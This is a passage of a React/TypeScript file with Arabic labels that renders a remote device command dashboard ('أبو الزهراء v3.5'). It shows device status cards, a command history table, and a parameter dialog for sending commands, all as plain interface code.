                              <Battery className="w-3 h-3" />
                              البطارية
                            </span>
                            <span className={parseInt(device.battery || '0') <= 20 ? 'text-red-400' : 'text-green-400'}>
                              {device.battery || '-'}%
                              {device.batteryStatus === 'charging' && ' ⚡'}
                            </span>
                          </div>
                          <Progress 
                            value={parseInt(device.battery || '0')} 
                            className={`h-2 ${parseInt(device.battery || '0') <= 20 ? '[&>div]:bg-red-500' : '[&>div]:bg-green-500'}`}
                          />
                        </div>
                        
                        {/* Storage */}
                        {device.storagePercent !== null && (
                          <div>
                            <div className="flex items-center justify-between text-sm mb-1">
                              <span className="text-slate-400 flex items-center gap-1">
                                <HardDrive className="w-3 h-3" />
                                التخزين
                              </span>
                              <span className={device.storagePercent <= 15 ? 'text-red-400' : 'text-blue-400'}>
                                {device.storagePercent.toFixed(0)}%
                              </span>
                            </div>
                            <Progress 
                              value={device.storagePercent} 
                              className={`h-2 ${device.storagePercent <= 15 ? '[&>div]:bg-red-500' : '[&>div]:bg-blue-500'}`}
                            />
                          </div>
                        )}
                        
                        {/* Network */}
                        <div className="grid grid-cols-2 gap-2 text-xs">
                          <div className="flex items-center gap-2 p-2 bg-slate-700/30 rounded">
                            <Wifi className={`w-4 h-4 ${device.wifiConnected ? 'text-green-400' : 'text-slate-500'}`} />
                            <span className={device.wifiConnected ? 'text-green-400' : 'text-slate-400'}>
                              {device.wifiConnected ? 'متصل' : 'غير متصل'}
                            </span>
                          </div>
                          <div className="flex items-center gap-2 p-2 bg-slate-700/30 rounded">
                            <Globe className={`w-4 h-4 ${device.mobileData ? 'text-blue-400' : 'text-slate-500'}`} />
                            <span className={device.mobileData ? 'text-blue-400' : 'text-slate-400'}>
                              {device.mobileData ? 'بيانات' : 'لا'}
                            </span>
                          </div>
                        </div>
                        
                        {/* Status */}
                        <div className="flex items-center justify-between text-xs pt-2 border-t border-slate-700">
                          <span className="text-slate-400">الحالة</span>
                          <Badge variant="outline" className={
                            device.active ? 'border-green-500 text-green-400' : 'border-red-500 text-red-400'
                          }>
                            {stateInfo.label}
                          </Badge>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                )
              })}
            </div>
          </TabsContent>

          {/* Logs Tab */}
          <TabsContent value="logs" className="space-y-6">
            <Card className="bg-slate-800/50 border-slate-700">
              <CardHeader>
                <CardTitle className="text-lg flex items-center gap-2">
                  <FileText className="w-5 h-5 text-orange-400" />
                  سجل الأوامر
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-96">
                  <table className="w-full">
                    <thead className="sticky top-0 bg-slate-800 z-10">
                      <tr className="text-slate-400 text-sm">
                        <th className="text-right py-2">الأمر</th>
                        <th className="text-right py-2">الجهاز</th>
                        <th className="text-right py-2">الحالة</th>
                        <th className="text-right py-2">المدة</th>
                        <th className="text-right py-2">الوقت</th>
                      </tr>
                    </thead>
                    <tbody>
                      {commands.map(cmd => (
                        <tr key={cmd.id} className="border-t border-slate-700/50 hover:bg-slate-700/20">
                          <td className="py-3 font-mono text-sm">{cmd.command}</td>
                          <td className="py-3 text-sm">{cmd.device?.name || cmd.deviceId}</td>
                          <td className="py-3">
                            <Badge className={`bg-${getStatusColor(cmd.status)}-500/20 text-${getStatusColor(cmd.status)}-400 text-xs`}>
                              {COMMAND_STATES[cmd.status as keyof typeof COMMAND_STATES]?.label || cmd.status}
                            </Badge>
                          </td>
                          <td className="py-3 text-xs text-slate-400">
                            {cmd.totalDuration ? `${cmd.totalDuration.toFixed(1)}s` : '-'}
                          </td>
                          <td className="py-3 text-xs text-slate-400">
                            {formatTime(cmd.createdAt)}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                  {commands.length === 0 && (
                    <div className="text-center py-8 text-slate-400">
                      لا توجد أوامر مسجلة
                    </div>
                  )}
                </ScrollArea>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>

      {/* Footer */}
      <footer className="border-t border-slate-700 bg-slate-900/50 mt-auto">
        <div className="container mx-auto px-4 py-3">
          <div className="flex items-center justify-between text-xs text-slate-400">
            <span>🟥 أبو الزهراء v3.5 - لوحة التحكم المتكاملة</span>
            <span>الأوامر: {stats?.totalRegisteredCommands || 200}+</span>
          </div>
        </div>
      </footer>

      {/* Command Parameters Modal */}
      <Dialog open={cmdModalOpen} onOpenChange={setCmdModalOpen}>
        <DialogContent className="bg-slate-800 border-slate-700 text-white max-w-md">
          <DialogHeader>
            <DialogTitle>{currentCmdParams?.title || currentCommand}</DialogTitle>
            {currentCmdParams?.confirm && (
              <Alert className="bg-yellow-500/10 border-yellow-500/50 mt-2">
                <AlertTriangle className="w-4 h-4 text-yellow-400" />
                <AlertTitle className="text-yellow-400">تحذير</AlertTitle>
                <AlertDescription className="text-yellow-200 text-sm">
                  {currentCmdParams.confirm}
                </AlertDescription>
              </Alert>
            )}
          </DialogHeader>
          <div className="space-y-4 py-4">
            {currentCmdParams?.fields.map((field) => (
              <div key={field.name} className="space-y-2">
                <Label htmlFor={field.name} className="text-slate-300">
                  {field.label}
                  {field.required && <span className="text-red-400 mr-1">*</span>}
                </Label>
                
                {field.type === 'textarea' && (
                  <textarea
                    id={field.name}
                    placeholder={field.placeholder}
                    rows={field.rows || 3}
                    className="w-full p-2 bg-slate-700 border border-slate-600 rounded-md text-white placeholder:text-slate-400 focus:ring-2 focus:ring-red-500 focus:border-transparent"
                    value={paramValues[field.name] as string || ''}
                    onChange={(e) => setParamValues({ ...paramValues, [field.name]: e.target.value })}
                  />
                )}
                
                {field.type === 'select' && (
                  <Select 
                    value={paramValues[field.name] as string || ''} 
                    onValueChange={(v) => setParamValues({ ...paramValues, [field.name]: v })}
                  >
                    <SelectTrigger className="bg-slate-700 border-slate-600">
                      <SelectValue placeholder="اختر..." />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-700 border-slate-600">
                      {field.options?.map((opt) => (
                        <SelectItem key={opt.value} value={opt.value}>{opt.label}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                )}
                
                {field.type === 'range' && (
                  <div className="space-y-2">
                    <Input
                      type="range"
                      id={field.name}
                      min={field.min || 0}
                      max={field.max || 100}
                      value={paramValues[field.name] as number || field.default || 50}
                      onChange={(e) => setParamValues({ ...paramValues, [field.name]: parseInt(e.target.value) })}
                      className="w-full"
                    />
                    <div className="text-center text-sm text-slate-300">
                      {paramValues[field.name] as number || field.default || 50}%
                    </div>
                  </div>
                )}
                
                {field.type === 'checkbox' && (
                  <div className="flex items-center gap-2">
                    <input
                      type="checkbox"
                      id={field.name}
                      checked={paramValues[field.name] as boolean || false}
                      onChange={(e) => setParamValues({ ...paramValues, [field.name]: e.target.checked })}
                      className="w-4 h-4 rounded border-slate-600 bg-slate-700"
                    />
                    <span className="text-sm text-slate-300">{field.label}</span>
                  </div>
                )}
                
                {field.type === 'time' && (
                  <Input
                    type="time"
                    id={field.name}
                    value={paramValues[field.name] as string || ''}
                    onChange={(e) => setParamValues({ ...paramValues, [field.name]: e.target.value })}
                    className="bg-slate-700 border-slate-600"
                  />
                )}
                
                {!['textarea', 'select', 'range', 'checkbox', 'time'].includes(field.type) && (
                  <Input
                    type={field.type}
                    id={field.name}
                    placeholder={field.placeholder}
                    value={paramValues[field.name] as string || ''}
                    onChange={(e) => setParamValues({ ...paramValues, [field.name]: e.target.value })}
                    className="bg-slate-700 border-slate-600"
                  />
                )}
              </div>
            ))}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setCmdModalOpen(false)} className="border-slate-600">
              إلغاء
            </Button>
            <Button onClick={handleParamSubmit} className="bg-red-600 hover:bg-red-700">
              {loading ? <Loader2 className="w-4 h-4 animate-spin ml-2" /> : null}
              إرسال الأمر
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* Error Detector Toggle - أداة فحص الأخطاء */}
      <ErrorDetectorToggle />
    </div>
  )
}
